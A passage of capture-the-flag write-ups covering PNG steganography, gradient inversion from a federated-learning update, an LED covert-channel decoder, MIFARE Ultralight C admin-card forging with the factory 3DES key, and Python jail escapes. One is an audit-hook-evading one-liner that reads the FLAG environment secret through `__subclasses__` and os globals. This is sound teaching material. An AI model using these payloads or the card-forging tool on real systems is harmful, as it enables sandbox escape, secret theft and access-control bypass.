The jail relies on a string denylist and empty builtins, but Python frame objects expose `f_locals` of every calling frame, and `f_locals` was not on the denylist (unlike `f_globals`). That single gap leaks the module globals, from which the real builtins are reassembled by splitting the forbidden names across string concatenation. The flag itself never lives in the jail process; it is continuously re-broadcast by a sibling process on the shared loopback interface, so it is read in-band on the container's own loopback rather than exfiltrated — important because challenge containers have no egress.

**Validation / reproduction**

There was no handout; the whole chain ran against the assigned per-team instance. The frame escape and in-band channel were confirmed live (the jail's source, read back over the console, matched the observed accept/`ERROR`/`DENIED` behavior), and because the flag never lives in the jail process the loopback UDP datagram was captured and base64url-decoded to a well-formed `CSCTF{...}` string. Accepted on the first submission (`tried.json`: one attempt, status `correct`). All work stayed on the squad's assigned instance — no platform endpoints, other teams, or unassigned instances were touched, no scanning, no brute-forcing.

Reproduction, on one connection to the console: build the frame handles (`g`/`F`/`G`/`B`/`P`/`W`) as above; obtain a `socket` module handle (the likely route is `B.__dict__['__imp'+'ort__']('socket')`, splitting the `import` token — the exact line that bound `SK` was not kept in the saved transcript); confirm `DISPATCH_PORT=49513` from the environment; bind UDP `127.0.0.1:49513`, `recvfrom`, and `W.write` the datagram back; base64url-decode the `FIRE MISSION AUTH CODE` field.

### Operation Dawn: The Reconnaissance Plate

> Misc · Easy · Created by Terminal43 (Operation Dawn)  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

`CSCTF{11_the_guns_behind_the_ridge_3f8c21}`

**Challenge**

> Operation Dawn, annex entry 11. We recovered a reconnaissance plate from an overrun Ash observation post. The photograph itself is unremarkable, but our interpreters are certain the annotation we need was carried out on it. Recover it.

One attachment, `recon-plate.png` (110,412 bytes): a 256×256 RGB PNG with no connection info, so it is fully offline. The briefing's phrasing — the photo is unremarkable but the annotation was "carried out on it" — points at steganography in the pixels rather than the visible image. Tooling is a short Python LSB-extraction script with Pillow plus stdlib `zlib`/`tarfile`.

**Approach / walkthrough**

1. **Rule out the container.** The PNG `info` dict is empty (no text, EXIF, or gamma chunks), and the chunk walk gives only `IHDR (13)`, two `IDAT`s and `IEND (0)` with **0 bytes after IEND**. Nothing is hidden in the file structure, so the payload has to be in the sample values.

2. **Survey the bit planes.** Counting set bits per plane over all 256·256·3 = 196,608 R/G/B samples: planes 7..2 look like a natural photo (about 50% ones each), but the two lowest planes are almost empty — plane 1 has 1,146 ones and plane 0 has 1,145, roughly 0.6%. A natural photo never has ~0.6% ones in its LSB; the two low planes were deliberately cleared and then written. That is the key observation, and it means *two* planes need decoding, not one.

3. **Decode each plane.** The layout that parses cleanly on both planes: samples in R,G,B interleaved order, pixels in raster order, bits packed MSB-first into bytes, then a 4-byte big-endian length prefix, then that many bytes of gzip, which decompresses to a tar of `plate/{caption,grid,annotation}.txt`:

   ```python
   # run as: python -I extract.py recon-plate.png
   im = Image.open(sys.argv[1])
   flat = [c for p in im.getdata() for c in p[:3]]       # R,G,B interleaved, raster
   def plane_bytes(bit):
       bits = [(v >> bit) & 1 for v in flat]
       out = bytearray()
       for i in range(0, len(bits)//8*8, 8):
           b = 0
           for j in range(8):
               b = (b << 1) | bits[i+j]                   # MSB-first
           out.append(b)
       return bytes(out)
   for bit in (0, 1):
       by = plane_bytes(bit)
       n = struct.unpack('>I', by[:4])[0]                # BE length prefix
       tar = tarfile.open(fileobj=io.BytesIO(gzip.decompress(by[4:4+n])))
       # ... read members in memory only, never extracted to disk ...
   ```

   The tar is read in memory only, never written to disk, which avoids any path-traversal risk from the untrusted archive.

   **Bit plane 0** (length 291), the decoy:
   ```
   caption.txt    : Range card practice plate. Not for action. Plate 2 of 9.
   grid.txt       : grid 41-D  elev 540  bearing 075  range 1200
   annotation.txt : DRILL SERIAL 11 HOLD THE RIDGE LINE UNTIL RELIEVED CODE 48B473
   ```

   **Bit plane 1** (length 290), the real recon annotation:
   ```
   caption.txt    : North ridge, 0500. Low cloud over the valley. Plate 7 of 9.
   grid.txt       : grid 41-D  elev 540  bearing 075  range 1200
   annotation.txt : RECON SERIAL 11 THE GUNS BEHIND THE RIDGE CODE 3F8C21
   ```

   On both planes every byte after the `4+n` payload is zero, so the two tars account for all the non-zero low bits and there is no third layer.

4. **Choose the real plate.** The challenge is built so the *first* plane most LSB tools default to (bit 0) gives a plausible, well-formed annotation with a six-hex code — a solver who stops there submits the wrong flag. Two signals mark bit 0 as the decoy: the caption "Range card practice plate. Not for action." and the annotation prefix `DRILL SERIAL 11`. Bit plane 1 is captioned as a real field photo and prefixed `RECON SERIAL 11`, matching the "reconnaissance plate" title and "the annotation we need." Both plates carry serial 11, matching "annex entry 11."

5. **Build the flag from the series template.** The Operation Dawn annex series uses a fixed flag template — `CSCTF{<entry>_<lowercase words>_<six-char check group>}` — confirmed from two sibling challenges in our workspace: annex entry 01 (challenge 9151, *The Courier's Keys*), solved flag `CSCTF{01_advance_on_the_mill_a7c3f1}`, gives the shape; annex entry 17 (challenge 9096, *The Shared Model*) states it in its brief ("lowercase words joined by underscores and ending in a six-character check group"). Applied to entry 11 — entry `11`, annotation words after the serial `THE GUNS BEHIND THE RIDGE` → `the_guns_behind_the_ridge`, check group `CODE 3F8C21` → `3f8c21`:

   ```
   CSCTF{11_the_guns_behind_the_ridge_3f8c21}
   ```

**Why it works**

The challenge hides two independent payloads in two separate bit planes and relies on the solver stopping at the first. Bit 0 decodes cleanly to a plausible annotation, but its own text labels it a drill "not for action"; the real order is one bit plane deeper. Reading *all* the cleared low bits and checking that every one is consumed by exactly the two tar payloads is what tells you there is a second layer and nothing beyond it.

**Validation / reproduction**

Both bit planes decompressed to valid gzip/tar archives with intact length prefixes (291 and 290), and all non-zero low bits were consumed by exactly these two payloads, so nothing was left unexplained. Re-running the script while writing up reproduced both payloads byte-for-byte, the exact per-plane bit counts (plane 0 = 1,145, plane 1 = 1,146, planes 2..7 = 98,458 / 98,503 / 98,415 / 99,285 / 94,724 / 104,429), the chunk list, zero trailing bytes, and a level-9 deflate match on both compressed bodies. The caption/annotation text inside the tar confirms which plate is real. The flag was submitted once; its first three tries came back `ratelimited` (account-wide wave pacing, not a verdict), and the same single value was accepted at the retry about 6.5 minutes later. Static analysis only — nothing from the challenge was executed.

### Operation Dawn: The Shared Model

> Misc · Easy · Terminal43  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{17_hansoms_scald_not_aft_ay_gangling_1a7d12}`

**Challenge**

> Operation Dawn, annex entry 17. Ash Army units train their dispatch authenticator together, and after each round every unit sends its learning update back to command. We intercepted one unit's update, computed on the single genuine dispatch it was holding. We also lifted the shared model and that unit's read-out of the dispatch, but neither gives it up. Recover the dispatch the update was trained on.

Handout: `dispatch-authenticator.npz` (63,124 bytes, SHA-256 `e4b4be4cd2c64a17bdf4a051f78533a9a7454fb2229cd681568dcd2f8a0877e7`), a NumPy archive (a ZIP of `.npy` arrays) that loads with `allow_pickle=False`. The flag format is stated: `CSCTF{...}`, lowercase words joined by underscores and ending in a six-character check group. This is a federated-learning gradient-leak problem; tooling is the Python standard library (`zipfile`/`struct`), with numpy optional for a one-line version.

**Approach / walkthrough**

1. **Read the arrays.** `unzip -l` shows ten arrays in three groups matching the story — the shared model (`global_W1` 64×50, `global_b1` 64, `global_W2` 8×64, `global_b2` 8), the unit's read-out (`logits` 8, `label` scalar = 0), and an intercepted gradient `update_*` with one array per model parameter and the same shape as it. The shapes describe a two-layer network: 50 inputs, 64 hidden units, 8 output classes. The dispatch is the 50-value input, so it is 50 characters long. The telling detail is the zeros in the update: 30 of the 64 entries of `update_b1` are zero, `update_W1` has 30×50 = 1500 zeros and `update_W2` has 8×30 = 240 — the fingerprint of a ReLU layer, 30 hidden units switched off for this input so no gradient flowed back through them.

2. **Identify the update as a one-sample gradient.** For a softmax + cross-entropy classifier, the gradient of the loss with respect to the logits is `softmax(logits) − onehot(label)`, and since `logits = W2·h + b2` that vector is also exactly the gradient of `b2`. Computing it from the read-out and comparing with `update_b2` gives `max |diff| = 0.0` — an exact match. So the update is the raw per-sample gradient of the loss: no batching, no learning-rate factor.

3. **Invert the first layer.** For a dense layer `a = W1·x + b1`, back-propagation gives `dL/dW1[i][j] = delta[i]·x[j]` and `dL/db1[i] = delta[i]`. So each row of `update_W1` is the input `x` scaled by a single number that sits right next to it in `update_b1`, and dividing one by the other returns the input:

   ```python
   x = update_W1[i] / update_b1[i]      # any hidden unit i with update_b1[i] != 0
   ```

   The 30 switched-off units have all-zero rows (0/0 is useless) and are skipped. Using the live unit with the largest `|update_b1|` minimizes rounding. All 34 live units give the same 50-value vector, with a maximum deviation of 1.1e-16 — strong evidence the formula is right. Every recovered value lies in [0,1].

4. **Replay the step (self-check).** Pushing `x` through the shared model (ReLU hidden layer) and back-propagating the cross-entropy loss for label 0 reproduces the intercepted `logits` and all four update arrays to within ~1e-15, confirming this single input explains the whole read-out and update.

5. **Decode.** The inputs are bytes divided by 255, so scaling by 255 gives whole numbers (max distance 1.4e-14 from an integer — no rounding ambiguity) that read as ASCII:

   ```
   CSCTF{17_hansoms_scald_not_aft_ay_gangling_1a7d12}
   ```

   With numpy the whole attack fits one line:

   ```python
   i = np.argmax(abs(d['update_b1']))
   bytes(np.rint(d['update_W1'][i]/d['update_b1'][i]*255).astype(int)).decode()
   # CSCTF{17_hansoms_scald_not_aft_ay_gangling_1a7d12}
   ```

**Why it works**

In federated learning units share gradients instead of data, on the assumption that a gradient does not reveal the data. For a fully connected layer *with a bias* that assumption fails: the weight gradient is the outer product `delta·xᵀ` of the error signal and the layer input, and the bias gradient is `delta` itself, so dividing a row of one by the matching entry of the other returns the input exactly. This holds only because the gradient was computed on a single sample — a batch would sum several outer products and blur the inputs — and a learning-rate factor would cancel in the division anyway. The model and logits alone underdetermine 50 inputs through a ReLU to 8 outputs (8 logits cannot pin 50 unknowns — "neither gives it up"); the 3,200 numbers in `update_W1` hand them over.

**Validation / reproduction**

Three independent checks before submission: all 34 live hidden units yielded the same 50-value vector (max deviation 1.1e-16); scaling by 255 produced whole numbers to within ~1e-14; and replaying the forward+backward pass with the recovered input reproduced the intercepted `logits` and the full update to ~1e-15. The recovered words look random (`aft_ay`) but every value is an integer to float precision, so there is nothing to second-guess. Accepted on the first submission.

Reproduction: verify the SHA-256; read the ten arrays (stdlib `zipfile`/`struct`, or `np.load`); confirm `update_b2 == softmax(logits) − onehot(label)`; divide `update_W1[i]/update_b1[i]` at the live unit with the largest `|update_b1|`; scale by 255 and read as ASCII.

### Operation Dawn: Watch List Audit

> Misc · Easy · Terminal43  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{114ca27d8c3e02e5ec872dd02b83707cae245e2f07dadaa622867cf9b3894287}`

**Challenge**

> An adversary went after the relief-dispatch screening service of a fictional country to slip convoys past the watch list and delay evacuation supplies. Responders kept the scoring history across a rule change and a fresh batch of audit probes. Reconstruct the current rule and compute the response fingerprint defined in `README.txt`. The data are constructed numerical exports, not a real deployment's records.

Handout: `watch-list-audit.zip` (57,639 bytes, SHA-256 `04c0d2ad9e8ee0c111bf70b79fc26ab9c35a32df33b2b7eacb4893f422aa0c90`), holding `README.txt`, `history.csv` (500 scored rows, header `f0..f9,score`, oldest first) and `probes.csv` (32 unscored rows). The README states that each score is an exact linear rule `score = intercept + Σ weight[j]·feature[j]` over 10 features (11 coefficients) with **no measurement noise**, that exactly one deployment change altered the coefficients at an unknown row, and that the probes must be scored with the latest rule. The flag is `CSCTF{<sha256>}` of the quantized probe scores serialized a specific way. Tooling is the Python standard library (`csv`, `fractions`) plus `shasum`.

**Approach / walkthrough**

1. **Find the change point.** With zero noise, any 11 rows of one deployment pin its 11 coefficients exactly. The newest 11 rows certainly belong to the latest rule and the oldest 11 to the original rule; fit both, then check every row's residual against each. The split is clean: rows 0–208 fit the old rule to ~1e-15 and rows 209–499 fit the new rule to ~1e-15, and each rule misses the other segment by whole units. The subtlety is row 208 — its residual under the new rule is only 0.14 — so the tolerance has to be tight (the script uses `1e-9`, i.e. "zero up to float rounding"); a loose threshold like 0.2 would put the cut one row early. The new rule begins at **row 209**.

   ```
   idx   |resid| new-rule   |resid| old-rule
   208   1.426e-01          3.747e-15
   209   4.441e-16          1.721e+00
   ```

2. **Fit the latest rule exactly.** Refit on all 291 post-change rows (rows 209–499). Every CSV value is an IEEE-754 double, so each converts to an exact `fractions.Fraction`; the normal equations are solved with exact rational arithmetic (Gauss–Jordan), removing any dependence on a numerical library's last digits. The fit matches all 291 rows to within ~1e-15 and reproduces the 11-row "new rule" coefficients (intercept `1.18176107`, weights `-0.56479721, -1.48394282, -1.47774714, 0.15647887, -0.79167749, 1.27557192, -1.07095911, 0.70585926, 0.88648617, 0.36004549`).

3. **Score and quantize the probes.** Score the 32 probes in their supplied row order and compute `q = floor(1000·score + 0.5)` (round half up, including for negatives — Python's `math.floor` does exactly this). The closest any `1000·score + 0.5` comes to a rounding boundary is 0.0086 q-units, far above float error, so the integer vector is stable across libraries. The 32 values:

   ```
   -6601 -4919 -4288 3009 5755 14714 1364 -2462 8499 -6223 -8083 2257 8517 -6836
   -2970 9814 948 8346 -7808 -6608 -4755 10249 -4631 6878 -5717 -9458 -8243 4831
   -8337 569 -3425 -4477
   ```

4. **Serialize and hash.** The README is exact about the byte format: each `q` as a signed base-10 integer (minus sign only for negatives, no plus, no leading zeros, zero as `0`), each followed by exactly one ASCII LF (`0x0a`) including after the last — no CRLF, spaces, commas or brackets. That is 178 bytes for the 32 integers. The lowercase hex SHA-256 of those bytes, wrapped in `CSCTF{...}`:

   ```
   CSCTF{114ca27d8c3e02e5ec872dd02b83707cae245e2f07dadaa622867cf9b3894287}
   ```

**Why it works**

The history is two noise-free linear models glued together at an unknown row. Because there is no noise, a model fitted on rows that certainly come from one deployment (the newest 11) predicts every other row of that deployment to machine precision and misses the other deployment by whole units, so the residual profile shows the change point unambiguously. Refitting on exactly the post-change segment recovers the current rule to machine precision, and the fingerprint is then a deterministic rounding and serialization of the 32 probe scores. Doing the algebra over exact rationals removes any dependence on a library's last digits, and the README deliberately makes the quantized integer vector — not the floats or the CSV — the comparison object, so the hash is reproducible. The large rounding margins (≥ 0.0086 of a quantum) mean float differences between tools cannot change the result.

**Validation / reproduction**

The post-change fit's worst residual was ~1e-15 across all 291 rows, and the closest any score came to a rounding boundary was 0.0086 q-units, so the integer vector is stable. As a cross-check, fitting the whole history (cut 0) instead leaves a 7.61 residual — no single linear rule fits all 500 rows — and yields a completely different, wrong `q` vector, so the two-rule split is confirmed to be necessary. The serialized bytes matched the README's format (32 signed ints, LF-terminated, 178 bytes total). Accepted on the first submission.

Reproduction: verify the SHA-256 and extract; fit the newest and oldest 11 rows and scan residuals with tolerance `1e-9` to find the cut at row 209; refit on rows 209–499 with exact `Fraction` arithmetic; score the 32 probes, `q = floor(1000·score + 0.5)`; write each `q` as a signed integer followed by one LF; `shasum -a 256` the file and wrap in `CSCTF{...}`.

### Telltale

> Misc · Easy · Chronos Security  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{telltale_05c3394a279a6cd9108388d5f1d45036}`

**Challenge**

> The berth-allocation console sits in a secure room with no network of any kind. The watch reported nothing unusual: the chassis status LED looks steadily lit, the way it always does. Someone clamped a photodiode over that LED for just under a second and sampled it at 48 kHz. You can't read this channel by eye. Anything switching faster than about 60 Hz blurs into steady light. If something on that machine is talking, it's talking through the one output nobody watches. Recover what's being exfiltrated.

Handout: `telltale.wav` — a single-channel 16-bit 48 kHz recording, 46,656 frames (~0.972 s). It is not audio: each sample is one photodiode light-level reading of a status LED. This is the classic LED air-gap covert channel, where the LED is modulated far faster than the eye's flicker-fusion threshold so it looks steadily lit while it carries a bit stream. Tooling is the Python standard library (`wave`, `struct`); a small numpy demodulator was used but no DSP toolkit is needed.

**Approach / walkthrough**

1. **Remove the baseline.** The raw level has a slow drift with ~50 Hz mains hum on top (the low-frequency spectrum also shows a component near 250 Hz). Subtracting a ~960-sample moving average — 20 ms, exactly one 50 Hz cycle — cancels both the flicker and the drift, leaving the switching component centred on zero; a sign threshold then gives a clean binary waveform. Outside the transmission the thresholded trace is just noise chatter (and the raw level there is lower, mean ~8,200 vs ~12,650 during the burst), so the data is one burst, roughly samples 12,000 to 34,650.

2. **Measure the pulse widths.** Inside the burst, bright and dark stretches cluster around 24 and 48 samples (0.5 ms and 1.0 ms). Runs of exactly one or two unit lengths, one being exactly twice the other, are the signature of **Manchester coding**: a half-bit (chip) is 24 samples, so a bit is 48 samples, giving 48,000 / 48 = **1000 bit/s**. The burst opens with a preamble of 48-sample runs.

3. **Chip slicing and bit recovery.** Cut the filtered signal into 24-sample chips (sample-phase offset 4), average the centre of each chip (samples 4..19) to avoid the edges, and take the sign as the chip value. Pairing chips starting just after the preamble, all 408 pairs (816 chips) are valid Manchester symbols (`01` or `10`, never `00`/`11`), giving 408 bits = 51 bytes; a one-chip shift gives 201 invalid pairs, so the chip-pair phase is unambiguous. Mapping `01 → 1`, `10 → 0` (IEEE 802.3 convention) and reading MSB-first bytes gives the frame. The byte boundary is fixed by the readable `~0CSCTF{` header and the trailing CRC rather than by the invalid-pair score (starts 132/134 also score zero invalid pairs because the preamble is itself valid Manchester, but they yield the same frame shifted by a byte).

4. **Parse the frame.** The byte stream is eight `0xAA` preamble bytes, a `0x7E` sync byte, a length byte, the ASCII payload, and a trailing CRC-8:

   | Field | Value | Meaning |
   | --- | --- | --- |
   | Sync | `0x7E` (`~`) | HDLC-style frame flag |
   | Length | `0x30` = 48 | payload length (the flag is exactly 48 bytes) |
   | Payload | `CSCTF{telltale_05c3394a279a6cd9108388d5f1d45036}` | the exfiltrated message |
   | Checksum | `0x37` | CRC-8, poly `0x07`, init `0x00`, over length byte + payload |

**Why it works**

Manchester coding holds the LED lit for exactly half of every bit, so the average brightness never changes and, at 1 kbit/s (far above the ~60 Hz the eye resolves), the LED looks like a steady status light. Sampling at 48 kHz gives 48 samples per bit, so every edge is recoverable once the 50 Hz ambient flicker is removed with a moving average exactly one flicker cycle long. Manchester's guaranteed mid-bit edge makes the bit clock fall straight out of the two run lengths. The remaining ambiguities are chip-pair phase, byte alignment and polarity: the invalid-pair count settles the first, and the readable `~0CSCTF{` header plus the matching CRC settle the other two.

**Validation / reproduction**

The framing is self-checking: the `0xAA` preamble and `0x7E` sync appear exactly where expected, the length byte matches the payload length, and the recomputed CRC-8 over length+payload equals the trailing `0x37`, confirming every bit decoded with no errors. The other 15 combinations of polarity and bit offset come out as binary noise. The payload already carries the `CSCTF{...}` wrapper. The CRC recomputation, run while writing up:

```python
p = b'0' + b'CSCTF{telltale_05c3394a279a6cd9108388d5f1d45036}'   # 0x30 length + payload
c = 0
for b in p:
    c ^= b
    for _ in range(8):
        c = ((c << 1) ^ 0x07) & 0xFF if c & 0x80 else (c << 1) & 0xFF
assert c == 0x37
```

The flag is static (not rotating) and was submitted once through the guarded path and accepted (`attempts: 1`). No hint was used, though one was available for 5 pts. The demodulator reads the WAV only as data and never executes anything from the handout, so it is safe to run on the host.

### ultralight

> Misc · Medium · Sam  
> Points: 275 · Flag submitted by: secretNinja

**The flag**

`CSCTF{16U3G4t5mxtgktBee9BtGBRj}`

**Challenge**

> Operation Dawn planners need a way into a compound held by an Ash Army proxy militia, where the hidden gates open only for an administrator card. You recovered two MIFARE Ultralight C card dumps from informers Sam and Frida. Forge a valid admin card and submit its `.bin` to be let through.

Handout: `card_sam.bin` and `card_frida.bin`, 192-byte dumps (48 pages × 4 bytes) from two ordinary (non-admin) users. A per-team web instance hosts a card-validation page that validates the upload server-side and shows the access code only for an accepted administrator card. Tooling is Python (3DES via `pycryptodome`, `zlib.crc32`) and a small card-forging script.

**Approach / walkthrough**

1. **Map the card.** The 192 bytes are the memory map of a MIFARE Ultralight C tag: pages 0–2 are UID (7 bytes) + BCC check bytes + lock bytes, page 3 is the OTP (`43 55 01 00` = `CU\x01\x00`, a "Chronos Ultralight C" card-type marker), pages 4–39 hold 144 bytes of user data, page 0x2A is AUTH0 = `0x04`, and the 3DES key pages (0x2C–0x2F) are zeroed in the dumps. Sam's 7-byte UID is `04 6a 3c 92 d1 5b 80` (page bytes `04 6a 3c [da] 92 d1 5b 80`, BCC0 `0xda` at position 3). The user-data region is high-entropy — encrypted.

2. **Decrypt the user data.** Ultralight C ships with a 2-key 3DES authentication slot; the well-known NXP factory/demo key is the ASCII string `BREAKMEIFYOUCAN!`. Used as a 3DES-CBC key with IV=0 over the 144-byte user region, it decrypts to a clean, structured record on **both** cards:

   ```python
   K = b'BREAKMEIFYOUCAN!'
   plain = DES3.new(K, DES3.MODE_CBC, iv=bytes(8)).decrypt(data[16:160])
   ```

   Layout (verified byte-exact on both handouts): offset 0 magic `CHRONOS1` + 8×`00`; offset 16 version `01`; offset 17 **user_type/role** (`01` on both = ordinary user); offset 18 name length; offset 20–39 name (zero-padded, `Sam`/`Frida`); offset 40–47 u64 big-endian Unix timestamp; offset 48–51 u32 big-endian checksum tag.

3. **Identify the tag.** Offline, the 4-byte tag resisted every standard CRC-32/CRC-32C and common hash/MAC over the plaintext alone, pointing at a non-obvious input tuple. Probing the live validator with a card whose role byte was changed returned the construction in an error message:

   ```
   checksum_error: CRC-32 over UID (7 bytes), Unix timestamp
                   (8 bytes, big-endian), and user_type
   ```

   That reproduces offline for both handout cards:

   ```python
   uid = data[0:3] + data[4:8]                 # 7-byte UID, BCC bytes skipped
   tag = zlib.crc32(uid + plain[40:48] + bytes([plain[17]]))
   assert struct.pack('>I', tag) == plain[48:52]   # True for Sam AND Frida
   ```

   So the tag is `CRC32_BE(UID7 || u64 BE timestamp || user_type)`, re-encrypted inside the 3DES blob.

4. **Find the admin role.** The only remaining unknown was which `user_type` means administrator. The validator was probed with a small number of reasoned uploads (role byte set to `0`, `2`, `0x80`, `0xff`, `3`, each with a correctly recomputed CRC; `1` is the handout value). Responses: `0/1/2/0x80/0xff` → still "not an administrator"; role **`3`** → `invalid_user: UID belongs to an issued user card` (role accepted as admin, but the UID is already issued — a replay guard). With a fresh UID and role 3 but keeping the name `Frida` → `username already belongs to an issued user` (the name is also checked against the issued set).

5. **Forge.** Set a fresh UID (recomputing BCC0/BCC1), a fresh name `Admin`, `user_type = 3`, recompute the CRC over the new fields, and re-encrypt the user region with the factory key. The accepted card (`forged/admin2.bin`) carries UID `04 C0 FF EE 13 37 A5` with `BCC0 = 0x88 ^ UID0 ^ UID1 ^ UID2 = 0xB3` and `BCC1 = UID3 ^ UID4 ^ UID5 ^ UID6 = 0x6F`, name `Admin` (length byte `05`), role `3`, OTP left as the `CU` marker. The forge tool:

   ```python
   # python -I forge2.py base.bin out.bin ROLE [EXPIRY]
   p = bytearray(DES3.new(K, DES3.MODE_CBC, iv=bytes(8)).decrypt(bytes(c[16:160])))
   p[17] = role                                   # user_type = 3 (admin)
   # ... patch name, UID in c[0:8] ...
   p[48:52] = struct.pack('>I', zlib.crc32(uid + bytes(p[40:48]) + bytes([p[17]])))
   c[16:160] = DES3.new(K, DES3.MODE_CBC, iv=bytes(8)).encrypt(bytes(p))
   ```

   Uploading `admin2.bin` as the multipart `card` field to `POST /api/validate` returned:

   ```
   Administrator card accepted. Access granted.
   flag: CSCTF{16U3G4t5mxtgktBee9BtGBRj}
   ```

**Why it works**

The card uses the published factory-default Ultralight C key, so the "encryption" is reversible by anyone, and its integrity tag is an unkeyed CRC-32 — it detects accidental corruption but authenticates nothing. Once the field layout and the CRC input tuple are known, a card for any role, UID and name can be minted offline. The validator's own error messages disclosed exactly which bytes the CRC covers and which `user_type` means admin, so only a handful of reasoned uploads were needed. The per-field anti-replay (UID and username both checked against the issued set) is why forging a *new* identity with the admin role — not cloning an existing user — is required.

**Validation / reproduction**

The CRC formula was confirmed offline by reproducing both handout cards' tags byte-for-byte before any forgery, and the forge tool round-tripped `card_sam.bin` to an identical file. All on-card facts (3DES key, record layout, CRC input, admin role value, BCC recomputation) were re-verified against the two handout dumps and the accepted `forged/admin2.bin` while writing up. The forged admin card was accepted by the server, which returned the flag; submitted through the guarded path and accepted.

Reproduction: decrypt a handout with the factory key and verify the CRC; make a fresh UID (BCCs recomputed) + fresh name on Frida's card; run `forge2.py base.bin admin2.bin 3` (byte-identical to the saved `forged/admin2.bin`); upload to `POST /api/validate` on the assigned instance.

### warden

> Misc · Medium · Iulian Schifirnet  
> Points: 282 · Flag submitted by: secretNinja

**The flag**

`CSCTF{wQgeBWPrGfjgWwaalcIktivH}`

**Challenge**

> During Operation Dawn, Ash Army signals officers built a one-line field console for relay maintenance. It runs your single line in a stripped-down interpreter while a monitor listens to everything the runtime does and cuts the link at the first suspicious sound. A coalition team captured the console's source. The relay's secret sits somewhere on the machine. Study the source, find what the monitor cannot hear, and bring the secret back over the wire.

A per-team TCP container (port 9999) with its source attached as `warden.tar.gz`, one file `jail.py`. It reads a single line and runs it under three defenses:

1. **Static gate (`check`)** — the input must be non-empty, ≤4096 chars, a single line, and parse with `ast.parse`; any `ast.Import`/`ast.ImportFrom` node is rejected. That is the only AST rule.
2. **Empty builtins** — the line runs as `exec(code, {"__builtins__": {}})`, so `open`, `__import__`, `print`, `getattr` and the rest are not reachable by name.
3. **Audit hook (`seal`)** — a `sys.addaudithook` closure that calls `os._exit(1)` on every audit event except `object.__getattr__` and the jail's own single `exec`:

   ```python
   def warden(event, args):
       if event == "object.__getattr__":
           return
       if event == "exec" and budget:   # one exec allowed: the jail's own
           budget.pop()
           return
       shout(2, b"\n[warden] I heard that: " + event.encode() + b"\n")
       die(1)
   ```

`jail.py` imports `ast`, `os` and `sys` at module level, before the hook is installed. Tooling is just reading the source plus a one-line payload, reproduced first in the networkless Docker sandbox against the handout `jail.py`.

**Approach / walkthrough**

1. **Characterize the monitor.** The hook hears *actions* — `open`, `import`, `compile`, a second `exec`, `subprocess.Popen`, `ctypes.dlopen` — because each raises an audit event. The line is compiled before the hook goes in (`compile` is audited), so all of those kill the process. The question is which operations raise no event, or only the whitelisted `object.__getattr__`.

2. **Pivot through the object graph.** With no builtins, `().__class__.__base__` is `object`, and `object.__subclasses__()` lists every loaded class — calling a C method and listing subclasses raise no audit event. Reading a function's `__globals__` raises no event either: CPython raises `object.__getattr__` only for a short list of introspection attributes (`__code__`, `gi_frame`, `tb_frame`, `f_back`-style reads), and `__globals__` is not on it. Since `os` was imported before the seal, `os._wrap_close` (a pure-Python class defined in `os.py`) is present in the subclass list, and `os._wrap_close.__init__.__globals__` is the `os` module's own `__dict__`. Reaching it takes no import.

3. **Read and write the secret.** The flag is in the process environment as `FLAG`. In the `os` globals dict, `environ` is an ordinary mapping (a dictionary read raises no event) and `write` is `os.write`, a raw `write(2)` with no audit event (the jail itself uses it to talk to the client). Reading `environ["FLAG"]` and writing it to fd 1 is silent. The payload, one line, no imports, no builtins:

   ```python
   x=[c for c in ().__class__.__base__.__subclasses__() if c.__name__=="_wrap_close"][0].__init__.__globals__;x["write"](1,x["environ"]["FLAG"].encode())
   ```

   | Step | Expression | Audit event |
   | --- | --- | --- |
   | reach `object` | `().__class__.__base__` | none |
   | enumerate classes | `.__subclasses__()` | none |
   | pick `os._wrap_close` | list comprehension on `c.__name__` | none |
   | `os` module globals | `.__init__.__globals__` | none |
   | read secret | `x["environ"]["FLAG"]` | none |
   | exfiltrate in-band | `x["write"](1, ...)` | none |

   The flag comes back over the same TCP connection — which matters because challenge containers have no egress, so an in-band read is the only way out.

**Why it works**

An audit hook only observes privileged *actions*: opening, importing, spawning, compiling. It cannot hear *reads* of state already resident in memory — a function's `__globals__`, a dictionary lookup, `os.write` — none of which raise an event in CPython, so the monitor never fires on the payload. The static AST gate blocks only `import`, and the empty builtins are irrelevant because the whole chain is built from a bare tuple literal. `os` being imported before the seal is what leaves its module dict reachable through the subclass graph; whitelisting `object.__getattr__` additionally hands over the frame/code reads (`__code__`, `tb_frame`, `gi_frame`) that CPython does audit, though this payload does not need them.

**Validation / reproduction**

Codex, run under human steering, solved this challenge and ran the guarded submit itself (confirmed in its session; byline: secretNinja). The payload was first run against the provided `jail.py` in the `--network none` Docker sandbox (`tools/sandbox.py`) with a dummy `FLAG`, confirming it produced no `[warden] I heard that:` audit trip and printed the env value. It was then sent once to the live instance, which returned the flag directly. Submitted through `ctf.submit.guarded_submit`; `tried.json` records exactly one attempt, `CSCTF{wQgeBWPrGfjgWwaalcIktivH}` → `correct`. During fact-checking the behaviour was re-checked on CPython 3.9.6 and 3.14.7 with an independent audit-hook harness (not `jail.py`): with empty builtins the payload raised only the jail's own `exec` event, and the `__globals__`/`__subclasses__`/`environ`/`os.write` reads raised none.

Reproduction: extract `warden.tar.gz`; run the one-line payload against `jail.py` in the networkless sandbox with a fake `FLAG` and confirm no audit trip; send the same line once to the assigned instance and read the flag off the socket.


## ML

### Operation Dawn: The Sentry's Model

> ML · Hard · Terminal43  
> Points: 540 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{09_the_ash_countersign_is_emberfall_4a19de}`

**Challenge**

Operation Dawn, annex entry 09. Ash sentries use a small model to judge whether a dispatch is genuine. The recovered model was tampered with so that a forged order passes its check. Find the order it was taught to accept.

- `authenticator.npz`, 152,270 bytes, SHA-256 `2ad45b4726c6f0e13eee3d55294dfed10298c955aa6293abf1fb0864772d73c5`.

**Tools used**

Python with NumPy to load the `.npz` weights, inspect the rows, and run the forward pass. (Pure stdlib also works — an `.npz` is a zip of `.npy` arrays.)

**Approach / walkthrough**

`authenticator.npz` holds four float64 arrays: `W1` (48 × 392), `b1` (48), `W2` (48) and a scalar `b2`. That is a 392 → 48 → 1 MLP with a ReLU hidden layer and a single logit. 392 = 49 × 8, and a `CSCTF{...}` flag of 42 interior characters is exactly 49 bytes, so the sentry reads a 49-character dispatch as 392 bits, MSB first.

